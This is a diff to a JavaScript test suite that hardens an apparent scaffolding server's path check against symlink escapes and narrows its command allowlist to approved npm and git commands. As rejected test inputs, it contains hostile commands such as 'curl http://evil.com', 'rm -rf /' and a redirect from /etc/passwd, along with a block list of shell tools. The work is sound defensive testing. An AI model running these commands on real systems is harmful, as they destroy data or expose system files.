@@ -84,9 +84,37 @@ function cleanTmpDir() {
 // ---------------------------------------------------------------------------
 
 function safePath(baseDir, subPath) {
+  const realpath = fs.realpathSync.native || fs.realpathSync;
+
+  function resolveRealPathCandidate(targetPath) {
+    const absolute = path.resolve(targetPath);
+    let probe = absolute;
+    const missingSegments = [];
+
+    while (!fs.existsSync(probe)) {
+      const parent = path.dirname(probe);
+      if (parent === probe) {
+        throw new Error(`Path does not have an existing ancestor: ${absolute}`);
+      }
+      missingSegments.unshift(path.basename(probe));
+      probe = parent;
+    }
+
+    const realExistingPath = realpath(probe);
+    return missingSegments.length === 0
+      ? realExistingPath
+      : path.join(realExistingPath, ...missingSegments);
+  }
+
   const resolved = path.resolve(baseDir, subPath);
   const base = path.resolve(baseDir);
-  if (!resolved.startsWith(base + path.sep) && resolved !== base) {
+  const baseReal = resolveRealPathCandidate(base);
+  const targetReal = resolveRealPathCandidate(resolved);
+  const relative = path.relative(baseReal, targetReal);
+  if (
+    relative &&
+    (relative === '..' || relative.startsWith(`..${path.sep}`) || path.isAbsolute(relative))
+  ) {
     throw new Error('Path traversal detected: path escapes the working directory');
   }
   return resolved;
@@ -101,10 +129,14 @@ describe('scaffold-server source security patterns', () => {
     assert.ok(source.includes('function safePath('), 'safePath must be defined');
   });
 
-  it('safePath checks for path traversal using startsWith', () => {
+  it('safePath checks canonical paths to block symlink escapes', () => {
     assert.ok(
-      source.includes("resolved.startsWith(base + path.sep)"),
-      'safePath must check resolved.startsWith(base + path.sep)',
+      source.includes('fs.realpathSync'),
+      'safePath must resolve real paths to block symlink escapes',
+    );
+    assert.ok(
+      source.includes('path.relative(baseReal, targetReal)'),
+      'safePath must compare canonicalized paths with path.relative',
     );
   });
 
@@ -135,8 +167,8 @@ describe('scaffold-server source security patterns', () => {
     );
   });
 
-  it('allowlist contains npm, npx, node, git', () => {
-    for (const cmd of ['npm', 'npx', 'node', 'git']) {
+  it('allowlist contains npm and git only', () => {
+    for (const cmd of ['npm', 'git']) {
       assert.ok(
         source.includes(`'${cmd}'`),
         `ALLOWED_EXECUTABLES must include '${cmd}'`,
@@ -144,8 +176,8 @@ describe('scaffold-server source security patterns', () => {
     }
   });
 
-  it('allowlist does NOT contain dangerous executables', () => {
-    for (const cmd of ['sh', 'bash', 'curl', 'wget', 'rm', 'sudo', 'eval']) {
+  it('allowlist does NOT contain dangerous or general-purpose runtimes', () => {
+    for (const cmd of ['sh', 'bash', 'curl', 'wget', 'rm', 'sudo', 'eval', 'node', 'npx', 'cat', 'ls', 'mkdir']) {
       // Check that they are not in the Set(...) definition
       const setMatch = source.match(/ALLOWED_EXECUTABLES\s*=\s*new Set\(\[([^\]]+)\]\)/);
       if (setMatch) {
@@ -286,6 +318,14 @@ describe('safePath()', () => {
     assert.equal(result, path.join(tmpDir, 'bar.txt'));
   });
 
+  it('rejects symlink escapes that point outside the working directory', () => {
+    fs.symlinkSync('/etc', path.join(tmpDir, 'etc-link'));
+    assert.throws(
+      () => safePath(tmpDir, 'etc-link/passwd'),
+      /Path traversal detected/,
+    );
+  });
+
   it('rejects empty subpath that resolves to parent of base', () => {
     // path.resolve('/tmp/scaffold-test-xxx', '..') === '/tmp'
     assert.throws(
@@ -420,47 +460,50 @@ describe('scaffold-templates source', () => {
 
 describe('command injection prevention (logic verification)', () => {
   // Replicate the allowlist & metachar logic from the source
-  const ALLOWED_EXECUTABLES = new Set(['npm', 'npx', 'node', 'git', 'ls', 'cat', 'mkdir']);
+  const ALLOWED_EXECUTABLES = new Set(['git', 'npm']);
+  const APPROVED_COMMANDS = new Set([
+    'git add .',
+    'git init',
+    'git status',
+    'npm ci --ignore-scripts',
+    'npm install --ignore-scripts',
+    'npm run build',
+    'npm run dev',
+    'npm run lint',
+    'npm run test',
+    'npm run typecheck',
+  ]);
   const SHELL_METACHAR_RE = /[;&|`$(){}!<>]/;
 
   function checkCommand(command) {
-    const trimmed = command.trim();
-    const executable = trimmed.split(/\s+/)[0];
+    const normalized = command.trim().split(/\s+/).filter(Boolean).join(' ');
+    const executable = normalized.split(' ')[0];
     if (!ALLOWED_EXECUTABLES.has(executable)) {
       return { allowed: false, reason: 'executable not in allowlist' };
     }
-    if (SHELL_METACHAR_RE.test(trimmed)) {
+    if (SHELL_METACHAR_RE.test(command)) {
       return { allowed: false, reason: 'shell metacharacters detected' };
+    }
+    if (!APPROVED_COMMANDS.has(normalized)) {
+      return { allowed: false, reason: 'command not in approved list' };
     }
     return { allowed: true };
   }
 
-  it('allows "npm install"', () => {
-    assert.ok(checkCommand('npm install').allowed);
+  it('allows "npm install --ignore-scripts"', () => {
+    assert.ok(checkCommand('npm install --ignore-scripts').allowed);
   });
 
-  it('allows "npx create-next-app my-store"', () => {
-    assert.ok(checkCommand('npx create-next-app my-store').allowed);
-  });
-
-  it('allows "node scripts/seed.js"', () => {
-    assert.ok(checkCommand('node scripts/seed.js').allowed);
+  it('allows "npm run dev"', () => {
+    assert.ok(checkCommand('npm run dev').allowed);
   });
 
   it('allows "git init"', () => {
     assert.ok(checkCommand('git init').allowed);
   });
 
-  it('allows "ls -la"', () => {
-    assert.ok(checkCommand('ls -la').allowed);
-  });
-
-  it('allows "cat package.json"', () => {
-    assert.ok(checkCommand('cat package.json').allowed);
-  });
-
-  it('allows "mkdir -p src/components"', () => {
-    assert.ok(checkCommand('mkdir -p src/components').allowed);
+  it('allows "git add ."', () => {
+    assert.ok(checkCommand('git add .').allowed);
   });
 
   it('rejects "rm -rf /"', () => {
@@ -474,18 +517,18 @@ describe('command injection prevention (logic verification)', () => {
     assert.ok(!result.allowed);
   });
 
+  it('rejects "node scripts/seed.js"', () => {
+    const result = checkCommand('node scripts/seed.js');
+    assert.ok(!result.allowed);
+  });
+
+  it('rejects "npx create-next-app my-store"', () => {
+    const result = checkCommand('npx create-next-app my-store');
+    assert.ok(!result.allowed);
+  });
+
   it('rejects "curl http://evil.com"', () => {
     const result = checkCommand('curl http://evil.com');
-    assert.ok(!result.allowed);
-  });
-
-  it('rejects "wget http://evil.com/malware"', () => {
-    const result = checkCommand('wget http://evil.com/malware');
-    assert.ok(!result.allowed);
-  });
-
-  it('rejects "sudo rm -rf /"', () => {
-    const result = checkCommand('sudo rm -rf /');
     assert.ok(!result.allowed);
   });
 
@@ -529,6 +572,12 @@ describe('command injection prevention (logic verification)', () => {
     const result = checkCommand('npm install < /etc/passwd');
     assert.ok(!result.allowed);
     assert.equal(result.reason, 'shell metacharacters detected');
+  });
+
+  it('rejects commands outside the approved list even with allowed executables', () => {
+    const result = checkCommand('npm install');
+    assert.ok(!result.allowed);
+    assert.equal(result.reason, 'command not in approved list');
   });
 });
 
@@ -1075,6 +1124,10 @@ describe('error handling in source', () => {
 
   it('run_command returns error for disallowed executables', () => {
     assert.ok(source.includes('Command not allowed. Permitted executables:'));
+  });
+
+  it('run_command returns error for commands outside the approved list', () => {
+    assert.ok(source.includes('Command not allowed. Approved commands:'));
   });
 
   it('run_command returns error for shell metacharacters', () => {
